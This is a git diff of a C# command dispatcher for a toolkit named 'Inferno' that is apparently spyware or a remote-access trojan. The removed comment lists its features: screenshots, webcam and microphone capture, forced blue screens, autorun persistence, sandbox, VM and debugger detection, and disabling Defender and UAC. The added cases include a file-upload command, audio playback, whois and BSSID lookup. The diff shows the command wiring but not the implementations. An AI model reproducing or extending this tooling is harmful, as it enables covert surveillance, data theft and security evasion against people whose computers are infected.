@@ -10,69 +10,7 @@ namespace Inferno
         [STAThreadAttribute]
         static void Main(string[] args)
         {
-            /*
-             Сlipboard:
-               clipboard.Set("123");
-               clipboard.Get();
-            Spy functions:
-               desktop.Screenshot("desktop.jpg");
-               webcam.Screenshot("webcam.jpg");
-               audio.record("record.wav", 10);
-            Evil:
-               evil.bsod();
-               evil.setWallpaper("file.jpg");
-            Activity:
-               activity.getWindowTitle();
-               activity.getCursorPosition();
-               activity.setCursorPosition(200, 200);
-               activity.userIsActive();
-
-
-            Autorun TaskScheduler method:
-               autorun.installTaskScheduler("C:\\Windows\\explorer.exe");
-               autorun.uninstallTaskScheduler("C:\\Windows\\explorer.exe");
-            Autorun Registry method:
-               autorun.installRegistry("C:\\Windows\\explorer.exe");
-               autorun.uninstallRegistry("C:\\Windows\\explorer.exe");
-            Autorun shell:startup method:
-               autorun.installShellStartup("C:\\Windows\\explorer.exe");
-               autorun.uninstallShellStartup("C:\\Windows\\explorer.exe");
-
-            Sandbox:
-               status.inSandboxie();
-            VirtualBox:   
-                status.inVirtualBox();
-            Debugger:
-                status.inDebugger();
-
-            Network:
-                network.downloadFile("url", "file.txt");
-
-            Bypass:
-                bypass.disableDefender();
-                bypass.disableUAC();
-                bypass.enableUAC();
-
-            Admin:
-                admin.isAdministrator();
-                admin.startFile("cmd.exe");
-
-            Power:
-                power.shutdown();
-                power.reboot();
-                power.hibernate();
-                power.logoff();
-
-            Encryption:
-                crypt.EncryptString("string", "key");
-                crypt.DecryptString("string", "key");
-
-                crypt.EncryptFile("SECRET.txt", "123");
-                crypt.DecryptFile("SECRET.txt.IEnc", "123");
-
-
-             */
-
+          
             // Get command line args
             string cmd = "", arg1 = "", arg2 = "", arg3 = "";
             if (args.Length > 0)
@@ -118,7 +56,12 @@ namespace Inferno
                     }
                 case "MICROPHONE_RECORD": // (filename, seconds)
                     {
-                        audio.record(Int32.Parse(arg2), arg1);
+                        audio.Record(Int32.Parse(arg2), arg1);
+                        break;
+                    }
+                case "AUDIO_PLAY": // (filename)
+                    {
+                        audio.Play(arg1);
                         break;
                     }
                 // Evil
@@ -209,6 +152,21 @@ namespace Inferno
                 case "NETWORK_DOWNLOAD_FILE": // (url, filename)
                     {
                         network.downloadFile(arg1, arg2);
+                        break;
+                    }
+                case "NETWORK_UPLOAD_FILE": // (filename)
+                    {
+                        network.uploadFile(arg1);
+                        break;
+                    }
+                case "NETWORK_WHOIS": // (ip)
+                    {
+                        network.Whois(arg1);
+                        break;
+                    }
+                case "NETWORK_BSSID_INFO": // (bssid)
+                    {
+                        network.BssidInfo(arg1);
                         break;
                     }
                 // Bypass
